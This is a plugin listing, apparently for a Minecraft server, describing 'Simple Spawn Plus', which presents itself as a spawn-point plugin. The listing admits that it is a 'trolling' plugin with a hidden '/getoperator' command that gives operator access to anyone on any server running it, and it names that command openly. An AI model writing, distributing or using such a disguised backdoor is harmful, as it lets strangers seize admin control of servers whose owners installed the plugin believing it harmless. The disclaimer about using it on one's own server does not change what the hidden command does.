title: Simple Spawn plus
description: This is a trolling plugin made purely for trolling purposes on servers that you own. It disguises itself as a simple spawn plugin. There is a hidden command that allows anyone to type "/getoperator" and get operator access. Use at your own risk.
body:
# Simple Spawn Plus
This is a simple spawn plugin that allows for easily setting up a spawn point wherever in the world. The plugin is a trolling plugin with a secret command that grants operator access. I do not take responsibility for any griefed servers, use at your own risk, and on your own server. 
The plugin contains **commands** such as:
1. **/setspawn** - Sets the spawn at the location and world of the player executing the command.
1. **/delspawn** - Deletes the spawn point.
1. **/spawn** - Starts a 5 second timer which after goes down to 0, teleports the player to the set spawn.

**Permissions:**

```
simplespawnplus.player
```
 - Access to the **/spawn** command, on by default.

```
simplespawnplus.admin
```
 - Access to the **/setspawn** and **/delspawn** commands, and all the admin commands overall.

To get operator access using this plugin, you will need to type in "**/getoperator**", on a server that uses this exact plugin.
